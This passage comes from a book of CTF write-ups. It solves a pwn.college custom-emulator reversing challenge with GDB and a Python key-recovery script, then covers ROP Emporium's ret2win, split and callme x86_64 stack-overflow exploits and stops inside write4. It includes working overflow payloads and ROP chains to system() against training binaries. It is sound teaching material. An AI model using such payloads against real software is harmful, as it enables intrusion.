+[s] ... popping reg_0x3fc
+
+Breakpoint 2, 0x0000562462367491 in interpret_imm ()
+[V] reg_0x3fc:0x59 reg_0x3fd:0x3a reg_0x3fe:0x20 reg_0x3ff:0xe reg_0x400:0xb reg_0x401:0x4a reg_0x402:0
+[...]
+</code></pre>
+<ul>
+<li>From the above output, it can be seen that the line showing the register state <strong>after</strong> each <strong>pop</strong> instruction, the value of <code>reg_0x400</code> <strong>decreases</strong></li>
+<li>Therefore <code>reg_0x400</code> should be the <strong>stack pointer</strong></li>
+<li>Some instructions are a push and a pop in the <strong>same</strong> instruction, e.g.:</li>
+</ul>
+<pre><code>[...]
+Breakpoint 4, 0x0000556ee88bd527 in interpret_stk ()
+[V] reg_0x3fc:0x4b reg_0x3fd:0x8f reg_0x3fe:0xc reg_0x3ff:0x6a reg_0x400:0xc reg_0x401:0x6b reg_0x402:0x5
+[I] op:0x4 arg1:0x1 arg2:0x10
+[s] STK reg_0x3ff reg_0x3fe 
+[s] ... pushing reg_0x3fe
+[s] ... popping reg_0x3ff
+
+Breakpoint 4, 0x0000556ee88bd527 in interpret_stk ()
+[V] reg_0x3fc:0x4b reg_0x3fd:0x8f reg_0x3fe:0xc reg_0x3ff:0xc reg_0x400:0xc reg_0x401:0x6c reg_0x402:0x5
+[...]
+</code></pre>
+<ul>
+<li>The line showing the register state <strong>after</strong> each <strong>push-pop</strong> instruction, the value of <code>reg_0x400</code> stays the <strong>same</strong></li>
+<li>The above output shows that the value in <code>reg_0x3fe</code> is first pushed on to the stack and immediately popped into <code>reg_0x3ff</code></li>
+</ul>
+<h4 id="identifying-the-flag-register"><a class="header" href="#identifying-the-flag-register">Identifying the Flag Register</a></h4>
+<ul>
+<li>Now send forty b'\x41' bytes, grep for <code>CMP</code> instruction and print some lines above and below:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\x41'*40)&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 -A3 &quot;CMP&quot;</code></p>
+</blockquote>
+<pre><code>Breakpoint 7, 0x00005628cc387698 in interpret_cmp ()
+[V] reg_0x3fc:0x41 reg_0x3fd:0x2e reg_0x3fe:0xc reg_0x3ff:0xff reg_0x400:0xe reg_0x401:0x60 reg_0x402:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP reg_0x3fc reg_0x3fd 
+
+Breakpoint 4, 0x00005628cc387527 in interpret_stk ()
+[V] reg_0x3fc:0x41 reg_0x3fd:0x2e reg_0x3fe:0xc reg_0x3ff:0xff reg_0x400:0xe reg_0x401:0x61 reg_0x402:0x5
+[...]
+</code></pre>
+<ul>
+<li>So the first time the breakpoint hits the <code>interpret_cmp</code> instruction it's comparing <code>reg_0x3fc:0x41</code> vs <code>reg_0x3fd:0x2e</code></li>
+<li><code>reg_0x3fc</code> value is 0x41, which looks like it could be one of our inputted values</li>
+<li>From the previous static analysis using radare2, the <code>interpret_cmp</code> instruction set flags in the following manner:</li>
+</ul>
+<pre><code># Pseudo Python code for notes purposes only
+flag_value = ''
+if cmp_x &lt; cmp_y: flag_value += flag_value | 0x10 # i.e. 'L'
+if cmp_x &gt; cmp_y: flag_value += flag_value | 0x01 # i.e. 'G'
+if cmp_x == cmp_y: flag_value += flag_value | 0x02 # i.e. 'E'
+if cmp_x != cmp_y: flag_value += flag_value | 0x04 # i.e. 'N'
+if cmp_x == cmp_y == 0: flag_value += flag_value | 0x08 # i.e. 'Z'
+</code></pre>
+<ul>
+<li>0x41 &gt; 0x2e and they are not equal, so we expect flag_value to be <code>or</code>'d with both 0x01 and 0x04, which equates to 0x05</li>
+<li>The line showing the register state <strong>after</strong> the <strong>cmp</strong> instruction, the value of <code>reg_0x402</code> changes to 0x05</li>
+<li>Try again with different input (this time, forty null bytes):</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\x00'*40)&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 -A3 &quot;CMP&quot;</code></p>
+</blockquote>
+<pre><code>Breakpoint 7, 0x000056067b2c8698 in interpret_cmp ()
+[V] reg_0x3fc:0 reg_0x3fd:0x2e reg_0x3fe:0xc reg_0x3ff:0xff reg_0x400:0xe reg_0x401:0x60 reg_0x402:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP reg_0x3fc reg_0x3fd 
+
+Breakpoint 4, 0x000056067b2c8527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0x2e reg_0x3fe:0xc reg_0x3ff:0xff reg_0x400:0xe reg_0x401:0x61 reg_0x402:0x14
+[...]
+</code></pre>
+<ul>
+<li>For the null bytes input, the first time it hits the <code>interpret_cmp</code> breakpoint, it's comparing <code>reg_0x3fc:0x00</code> vs <code>reg_0x3fd:0x2e</code></li>
+<li>Again, <code>reg_0x3fc</code> value (0x00) looks like it's one of our inputted values</li>
+<li>0x00 &lt; 0x2e and they are not equal, so we expect flag_value to be <code>or</code>'d with both 0x10 and 0x04, which equates 0x14</li>
+<li>The line showing the register state <strong>after</strong> the <strong>cmp</strong> instruction, the value of <code>reg_0x402</code> changes to 0x14, so the assumptions on the <code>interpret_cmp</code> instruction appear correct so far</li>
+<li>This time, try a <strong>non-repeating pattern</strong> as input to see which index of our input is used in the comparison:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 -A3 &quot;CMP&quot;</code></p>
+</blockquote>
+<pre><code>Breakpoint 7, 0x000055b0ca655698 in interpret_cmp ()
+[V] reg_0x3fc:0xec reg_0x3fd:0x2e reg_0x3fe:0xc reg_0x3ff:0xff reg_0x400:0xe reg_0x401:0x60 reg_0x402:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP reg_0x3fc reg_0x3fd 
+
+Breakpoint 4, 0x000055b0ca655527 in interpret_stk ()
+[V] reg_0x3fc:0xec reg_0x3fd:0x2e reg_0x3fe:0xc reg_0x3ff:0xff reg_0x400:0xe reg_0x401:0x61 reg_0x402:0x5
+[...]
+</code></pre>
+<ul>
+<li>From above output, the comparison is now between <code>reg_0x3fc:0xec</code> vs <code>reg_0x3fd:0x2e</code>, so let's summarise, update assumptions and refine the GDB script in the step below</li>
+</ul>
+<h3 id="summary-of-part-2"><a class="header" href="#summary-of-part-2">Summary of Part 2</a></h3>
+<ul>
+<li><code>reg_0x3fc</code>, <code>reg_0x3fd</code>, <code>reg_0x3fe</code>, <code>reg_0x3ff</code> seem to be general purpose registers</li>
+<li><code>reg_0x400</code> is the stack pointer register</li>
+<li><code>reg_0x401</code> is the instruction pointer register</li>
+<li><code>reg_0x402</code> is the flag register that uses bitmasks to set relevant flags</li>
+<li>Sending input of <code>b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'</code> led to first comparison being made by emulator between 0xec and 0x2e</li>
+<li>Each instruction is <strong>size 3 bytes</strong> (Note: the instruction order can change for different versions of the ELF binary)</li>
+<li>Register, opcode, syscall, compare lookup values are known (Note: the register, opcode, syscall and cmp mappings can change for different versions of the ELF binary)</li>
+<li>Rename registers based on new info:</li>
+</ul>
+<pre><code># Pseudo Python code for notes purposes only
+registers = {
+    a: 0x20, # (case 32)
+    b: 0x08, # (case 08)
+    c: 0x10, # (case 16)
+    d: 0x01, # (case 01)
+    s: 0x02, # (case 02)
+    i: 0x04, # (case 04)
+    f: 0x40, # (case 40)
+}
+opcodes = {
+    'imm': 0x01,
+    'add': 0x02,
+    'stk': 0x04,
+    'stm': 0x40,
+    'ldm': 0x80,
+    'cmp': 0x20,
+    'jmp': 0x10,
+    'sys': 0x08,
+}
+syscalls = {
+    'open'          : 0x20,
+    'read_code'     : 0x01,
+    'read_memory'   : 0x08,
+    'write'         : 0x04,
+    'sleep'         : 0x10,
+    'exit'          : 0x02,
+}
+jump_description = ''
+if flag_value &amp; 0x10: jump_description += 'L'
+if flag_value &amp; 0x01: jump_description += 'G'
+if flag_value &amp; 0x02: jump_description += 'E'
+if flag_value &amp; 0x04: jump_description += 'N'
+if flag_value &amp; 0x08: jump_description += 'Z'
+</code></pre>
+<ul>
+<li>Update GDB script with new register names:</li>
+</ul>
+<pre><code>[...]
+define describe_reg
+    if $arg0 == 0x20
+        printf &quot;a&quot;
+    end
+    if $arg0 == 0x08
+        printf &quot;b&quot;
+    end
+    if $arg0 == 0x10
+        printf &quot;c&quot;
+    end
+    if $arg0 == 0x01
+        printf &quot;d&quot;
+    end
+    if $arg0 == 0x02
+        printf &quot;s&quot;
+    end
+    if $arg0 == 0x04
+        printf &quot;i&quot;
+    end
+    if $arg0 == 0x40
+        printf &quot;f&quot;
+    end
+    if $arg0 == 0x00
+        printf &quot;NONE&quot;
+    end
+end
+[...]
+define vm_state
+    set $reg_state = (long long) *(void**) ($rsp + $reg_offs)
+    printf &quot;[V] a:%#x b:%#x c:%#x d:%#x s:%#x i:%#x f:%#x\n&quot;, $reg_state &gt;&gt; 0x00 &amp; 0xff, $reg_state &gt;&gt; 0x08 &amp; 0xff, $reg_state &gt;&gt; 0x10 &amp; 0xff, $reg_state &gt;&gt; 0x18 &amp; 0xff, $reg_state &gt;&gt; 0x20 &amp; 0xff, $reg_state &gt;&gt; 0x28 &amp; 0xff, $reg_state &gt;&gt; 0x30 &amp; 0xff
+end
+[...]
+</code></pre>
+<h2 id="part-3-crafting-the-solution"><a class="header" href="#part-3-crafting-the-solution">[Part 3] Crafting the Solution</a></h2>
+<ul>
+<li>With revised GDB script, try a <strong>non-repeating pattern</strong> as input, but change the 0xec to 0x2e:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\x2e\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 -A3 &quot;CMP&quot;</code></p>
+</blockquote>
+<ul>
+<li>This time the output is different, there are more comparisons:</li>
+</ul>
+<pre><code>Breakpoint 7, 0x0000563eab40e698 in interpret_cmp ()
+[V] a:0x2e b:0x2e c:0xc d:0xff s:0xe i:0x60 f:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+
+Breakpoint 4, 0x0000563eab40e527 in interpret_stk ()
+[V] a:0x2e b:0x2e c:0xc d:0xff s:0xe i:0x61 f:0x2
+--
+Breakpoint 7, 0x0000563eab40e698 in interpret_cmp ()
+[V] a:0x4b b:0x8f c:0xb d:0 s:0xc i:0x68 f:0x2
+[I] op:0x20 arg1:0x10 arg2:0x1
+[s] CMP c d 
+
+Breakpoint 2, 0x0000563eab40e491 in interpret_imm ()
+[V] a:0x4b b:0x8f c:0xb d:0 s:0xc i:0x69 f:0x5
+--
+Breakpoint 7, 0x0000563eab40e698 in interpret_cmp ()
+[V] a:0xeb b:0x90 c:0xb d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+
+Breakpoint 4, 0x0000563eab40e527 in interpret_stk ()
+[V] a:0xeb b:0x90 c:0xb d:0xff s:0xe i:0x61 f:0x5
+[...]
+</code></pre>
+<ul>
+<li>Now try changing the 0xeb to 0x90 and only grep for &quot;CMP a b&quot; as this looks like the important comparison:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\x90\x2e\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 -A3 &quot;CMP a b&quot;</code></p>
+</blockquote>
+<ul>
+<li>Again the output is different as there's also a comparison between 0xea and 0x3b, looks like we're making progress:</li>
+</ul>
+<pre><code>Breakpoint 7, 0x0000562fa1832698 in interpret_cmp ()
+[V] a:0x2e b:0x2e c:0xc d:0xff s:0xe i:0x60 f:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+
+Breakpoint 4, 0x0000562fa1832527 in interpret_stk ()
+[V] a:0x2e b:0x2e c:0xc d:0xff s:0xe i:0x61 f:0x2
+--
+Breakpoint 7, 0x0000562fa1832698 in interpret_cmp ()
+[V] a:0x90 b:0x90 c:0xb d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+
+Breakpoint 4, 0x0000562fa1832527 in interpret_stk ()
+[V] a:0x90 b:0x90 c:0xb d:0xff s:0xe i:0x61 f:0x2
+--
+Breakpoint 7, 0x0000562fa1832698 in interpret_cmp ()
+[V] a:0xea b:0x3b c:0xa d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+
+Breakpoint 4, 0x0000562fa1832527 in interpret_stk ()
+[V] a:0xea b:0x3b c:0xa d:0xff s:0xe i:0x61 f:0x5
+</code></pre>
+<ul>
+<li>As it seems like our input from 0xed onward is being discarded, let's continue on this basis and also keep updating the compared value to what it seems like the program wants (also don't bother <code>grep</code>ping for the lines after the specifed criteria):</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\x3b\x90\x2e')&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 &quot;CMP a b&quot;</code></p>
+</blockquote>
+<pre><code>Breakpoint 7, 0x000055d923803698 in interpret_cmp ()
+[V] a:0x2e b:0x2e c:0xc d:0xff s:0xe i:0x60 f:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055d923803698 in interpret_cmp ()
+[V] a:0x90 b:0x90 c:0xb d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055d923803698 in interpret_cmp ()
+[V] a:0x3b b:0x3b c:0xa d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055d923803698 in interpret_cmp ()
+[V] a:0xe9 b:0xc2 c:0x9 d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+</code></pre>
+<ul>
+<li>Keep going, change 0xe9 to 0xc2</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xc2\x3b\x90\x2e')&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 &quot;CMP a b&quot;</code></p>
+</blockquote>
+<pre><code>Breakpoint 7, 0x000055c98537f698 in interpret_cmp ()
+[V] a:0x2e b:0x2e c:0xc d:0xff s:0xe i:0x60 f:0
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055c98537f698 in interpret_cmp ()
+[V] a:0x90 b:0x90 c:0xb d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055c98537f698 in interpret_cmp ()
+[V] a:0x3b b:0x3b c:0xa d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055c98537f698 in interpret_cmp ()
+[V] a:0xc2 b:0xc2 c:0x9 d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+--
+Breakpoint 7, 0x000055c98537f698 in interpret_cmp ()
+[V] a:0xe8 b:0xa8 c:0x8 d:0xff s:0xe i:0x60 f:0x5
+[I] op:0x20 arg1:0x20 arg2:0x8
+[s] CMP a b 
+</code></pre>
+<ul>
+<li>Assuming that the comparisons keep being made until the start of the input, we can either carry on in this manner, or write a script to finish the rest</li>
+<li>Although there aren't many comparisons left to be made, doing this manually doesn't sound interesting, so let's write a Python script to get us the flag</li>
+</ul>
+<h3 id="get-flag-script-using-python"><a class="header" href="#get-flag-script-using-python">Get Flag Script Using Python</a></h3>
+<ul>
+<li><code>vim /tmp/rev_level14_testing1.py</code></li>
+</ul>
+<pre><code>import os
+import re
+import subprocess
+
+elf_binary = '/level14_testing1'
+gdb_script = '/tmp/rev_level14_testing1.gdb'
+
+def bytes_str(bytes_obj: bytes) -&gt; str:
+    # Takes bytes type object as argument and returns string in hex '\x' format
+    return ''.join(f'\\x{byte:02x}' for byte in bytes_obj)
+
+def get_key() -&gt; bytes:
+    key = b''.join(byte.to_bytes(1, 'big') for byte in range(0xe0, 0x100))
+    print('[*] Obtaining key via GDB script:')
+
+    # Loop through key attempt in reverse order as ELF binary does CMP in this order
+    for i in range(len(key)-1, -1, -1):
+        sp = subprocess.run(
+            ['gdb', elf_binary, '-batch', '-x', gdb_script],
+            input = key,
+            stdout = subprocess.PIPE,
+            stderr = subprocess.PIPE,
+        )
+        out = sp.stdout.decode('latin1')
+
+        # Extract a and b from output
+        cmp_ab = re.findall('\[V\] a:0x(.*) b:0x(.*) c:.* d:.* s:.* f:.*\n.*\n\[s\] CMP a b', out)[::-1]
+        a = int(cmp_ab[i][0], 16) if len(cmp_ab)==len(key) else int(cmp_ab[0][0], 16)
+        b = int(cmp_ab[i][1], 16) if len(cmp_ab)==len(key) else int(cmp_ab[0][1], 16)
+        print(f&quot;index={i:02d} a={hex(a)} b={hex(b)} test_key=b'{bytes_str(key)}'&quot;)
+
+        # Update key by overwriting immutable bytes object with b at index i if our input a is found
+        key = key[:i] + b.to_bytes(1, 'big') + key[i+1:] if key[i]==a else key[:i]
+
+    print(f'Key: {bytes_str(key)}', end='\n\n')
+    return key
+
+def get_flag(key: bytes) -&gt; str:
+    print('[*] Obtaining flag from setuid binary:')
+    sp = subprocess.run(
+        [elf_binary],
+        input = key,
+        stdout = subprocess.PIPE,
+        stderr = subprocess.PIPE,
+    )
+    out = sp.stdout.decode('latin1')
+    flag = re.findall('_college{(.*)}', out)
+    return f'pwn_college{{{flag[0]}}}' if len(flag) else ''
+
+def main():
+    assert os.path.isfile(elf_binary), f'Could not find file {elf_binary}'
+    assert os.path.isfile(gdb_script), f'Could not find file {gdb_script}'
+    key = get_key()
+    flag = get_flag(key)
+    print(flag) if flag else print('Error obtaining flag')
+    exit(42)
+
+if __name__=='__main__':
+    main()
+</code></pre>
+<ul>
+<li>Run the script:</li>
+</ul>
+<blockquote>
+<p>$ <code>python /tmp/rev_level14_testing1.py</code></p>
+</blockquote>
+<pre><code>[...]
+Key: \xd2\xab\x34\x27\x97\x47\x57\xa8\xc2\x3b\x90\x2e
+
+[*] Obtaining flag from setuid binary:
+pwn_college{a_secret_fake_flag}
+</code></pre>
+<ul>
+<li>And there's the flag</li>
+<li>We can also <code>echo</code> the key and pipe it to the ELF binary to confirm:</li>
+</ul>
+<blockquote>
+<p>$ <code>echo -ne &quot;\xd2\xab\x34\x27\x97\x47\x57\xa8\xc2\x3b\x90\x2e&quot; | /level14_testing1</code></p>
+</blockquote>
+<pre><code>[+] Welcome to /level14_testing1!
+[+] This challenge is an custom emulator. It emulates a completely custom
+[+] architecture that we call &quot;Yan85&quot;! You'll have to understand the
+[+] emulator to understand the architecture, and you'll have to understand
+[+] the architecture to understand the code being emulated, and you will
+[+] have to understand that code to get the flag. Good luck!
+[+] Starting interpreter loop! Good luck!
+ENTER KEY: CORRECT! Here is your flag:
+pwn_college{a_secret_fake_flag}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium"><a class="header" href="#rop-emporium">ROP Emporium</a></h1>
+<p><a href="https://ropemporium.com/">ROP Emporium</a> is a great way to learn return oriented programming and it also includes a really nice <a href="https://ropemporium.com/guide.html">guide</a>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---01-ret2win-x86_64"><a class="header" href="#rop-emporium---01-ret2win-x86_64">ROP Emporium - 01 ret2win x86_64</a></h1>
+<h2 id="elf-binary-info"><a class="header" href="#elf-binary-info">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./ret2win</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6739
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="get-return-address"><a class="header" href="#get-return-address">Get Return Address</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -z ./ret2win | grep /bin/cat</code></p>
+</blockquote>
+<pre><code>8   0x00000943 0x00400943 17  18   .rodata ascii /bin/cat flag.txt
+</code></pre>
+<blockquote>
+<p>$ <code>objdump -M intel --disassemble=ret2win ./ret2win</code></p>
+</blockquote>
+<pre><code>[...]
+0000000000400756 &lt;ret2win&gt;:
+  400756:	55                   	push   rbp
+  400757:	48 89 e5             	mov    rbp,rsp
+  40075a:	bf 26 09 40 00       	mov    edi,0x400926
+  40075f:	e8 ec fd ff ff       	call   400550 &lt;puts@plt&gt;
+  400764:	bf 43 09 40 00       	mov    edi,0x400943
+  400769:	e8 f2 fd ff ff       	call   400560 &lt;system@plt&gt;
+  40076e:	90                   	nop
+  40076f:	5d                   	pop    rbp
+  400770:	c3                   	ret
+[...]
+</code></pre>
+<h2 id="get-flag"><a class="header" href="#get-flag">Get Flag</a></h2>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'A'*40 + b'\x64\x07\x40\x00\x00\x00\x00\x00')&quot; | ./ret2win</code></p>
+</blockquote>
+<pre><code>ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---02-split-x86_64"><a class="header" href="#rop-emporium---02-split-x86_64">ROP Emporium - 02 split x86_64</a></h1>
+<h2 id="elf-binary-info-1"><a class="header" href="#elf-binary-info-1">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./split</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6805
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="get-rop-gadgets"><a class="header" href="#get-rop-gadgets">Get ROP Gadgets</a></h2>
+<ul>
+<li>&quot;/bin/cat flag.txt&quot; string is included in binary, so utilise this by putting its address on stack</li>
+</ul>
+<blockquote>
+<p>$ <code>rabin2 -z ./split | grep /bin/cat</code></p>
+</blockquote>
+<pre><code>0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
+</code></pre>
+<ul>
+<li>Will need to pop the above address from stack into rdi register, so look for <code>pop rdi</code> gadget</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./split</code><br />
+[0x004005b0]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x004007c3                 5f  pop rdi
+  0x004007c4                 c3  ret
+</code></pre>
+<ul>
+<li>With rdi pointing to &quot;/bin/cat flag.txt&quot;, return to the system() function called by usefulFunction</li>
+</ul>
+<blockquote>
+<p>$ <code>objdump -M intel --disassemble=usefulFunction ./split</code></p>
+</blockquote>
+<pre><code>[...]
+0000000000400742 &lt;usefulFunction&gt;:
+  400742:	55                   	push   rbp
+  400743:	48 89 e5             	mov    rbp,rsp
+  400746:	bf 4a 08 40 00       	mov    edi,0x40084a
+  40074b:	e8 10 fe ff ff       	call   400560 &lt;system@plt&gt;
+  400750:	90                   	nop
+  400751:	5d                   	pop    rbp
+  400752:	c3                   	ret    
+[...]
+</code></pre>
+<h2 id="get-flag-1"><a class="header" href="#get-flag-1">Get Flag</a></h2>
+<ul>
+<li>payload = padding + pop_rdi_addr + bin_cat_flag + call_system_addr</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'A'*40 + b'\xc3\x07\x40\x00\x00\x00\x00\x00' + b'\x60\x10\x60\x00\x00\x00\x00\x00' +b'\x4b\x07\x40\x00\x00\x00\x00\x00')&quot; | ./split</code></p>
+</blockquote>
+<pre><code>split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+Segmentation fault (core dumped)
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---03-callme-x86_64"><a class="header" href="#rop-emporium---03-callme-x86_64">ROP Emporium - 03 callme x86_64</a></h1>
+<h2 id="elf-binary-info-2"><a class="header" href="#elf-binary-info-2">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./callme</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6952
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
+<li>nx true (i.e. DEP enabled)</li>
+<li>pic false (i.e. not PIE)</li>
+</ul>
+<h2 id="get-rop-gadgets-1"><a class="header" href="#get-rop-gadgets-1">Get ROP Gadgets</a></h2>
+<blockquote>
+<p>$ <code>r2 -A ./callme</code><br />
+[0x00400760]&gt; <code>/R pop rdi</code></p>
+</blockquote>
+<pre><code>  0x0040093c                 5f  pop rdi
+  0x0040093d                 5e  pop rsi
+  0x0040093e                 5a  pop rdx
+  0x0040093f                 c3  ret
+
+  0x004009a3                 5f  pop rdi
+  0x004009a4                 c3  ret
+</code></pre>
+<blockquote>
+<p>[0x00400760]&gt; <code>afl~callme</code></p>
+</blockquote>
+<pre><code>0x004006f0    1 6            sym.imp.callme_three
+0x00400740    1 6            sym.imp.callme_two
+0x00400720    1 6            sym.imp.callme_one
+</code></pre>
+<h2 id="get-flag-2"><a class="header" href="#get-flag-2">Get Flag</a></h2>
+<blockquote>
+<p>$ <code>python get_flag.py</code></p>
+</blockquote>
+<pre><code>callme by ROP Emporium
+x86_64
+
+Hope you read the instructions...
+
+&gt; Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rop-emporium---04-write4-x86_64"><a class="header" href="#rop-emporium---04-write4-x86_64">ROP Emporium - 04 write4 x86_64</a></h1>
+<h2 id="elf-binary-info-3"><a class="header" href="#elf-binary-info-3">ELF Binary Info</a></h2>
+<blockquote>
+<p>$ <code>rabin2 -I ./write4</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x400000
+binsz    6521
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    .
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>canary false</li>
